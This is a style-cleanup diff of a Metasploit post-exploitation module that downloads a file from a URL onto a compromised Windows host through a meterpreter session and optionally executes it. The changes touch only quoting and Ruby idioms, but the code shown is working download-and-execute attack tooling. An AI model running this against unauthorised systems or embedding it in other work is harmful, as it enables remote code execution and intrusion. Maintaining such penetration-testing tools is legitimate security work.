@@ -10,7 +10,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => "Windows Manage Download and/or Execute",
+        'Name' => 'Windows Manage Download and/or Execute',
         'Description' => %q{
           This module will download a file by importing urlmon via railgun.
           The user may also choose to execute the file with arguments via exec_string.
@@ -67,23 +67,23 @@ class MetasploitModule < Msf::Post
           ['PBLOB', 'lpfnCB', 'inout']
         ]
       )
-      vprint_good("urlmon loaded and configured")
+      vprint_good('urlmon loaded and configured')
     else
-      vprint_status("urlmon already loaded")
+      vprint_status('urlmon already loaded')
     end
   end
 
   def run
     # Make sure we meet the requirements before running the script, note no need to return
     # unless error
-    return 0 if session.type != "meterpreter"
+    return 0 if session.type != 'meterpreter'
 
     # get time
     strtime = Time.now
 
     # check/set vars
-    url = datastore["URL"]
-    filename = datastore["FILENAME"] || url.split('/').last
+    url = datastore['URL']
+    filename = datastore['FILENAME'] || url.split('/').last
 
     path = datastore['DOWNLOAD_PATH']
     if path.blank?
@@ -109,8 +109,8 @@ class MetasploitModule < Msf::Post
     begin
       out = session.fs.file.stat(outpath)
       print_status("#{out.stathash['st_size']} bytes downloaded to #{outpath} in #{(Time.now - strtime).to_i} seconds ")
-    rescue
-      print_error("File not found. The download probably failed")
+    rescue StandardError
+      print_error('File not found. The download probably failed')
       return
     end
 
@@ -121,7 +121,7 @@ class MetasploitModule < Msf::Post
 
         print_status("Executing file: #{cmd}")
         res = cmd_exec(cmd, nil, datastore['EXEC_TIMEOUT'])
-        print_good(res) if output and not res.empty?
+        print_good(res) if output && !res.empty?
       rescue ::Exception => e
         print_error("Unable to execute: #{e.message}")
       end
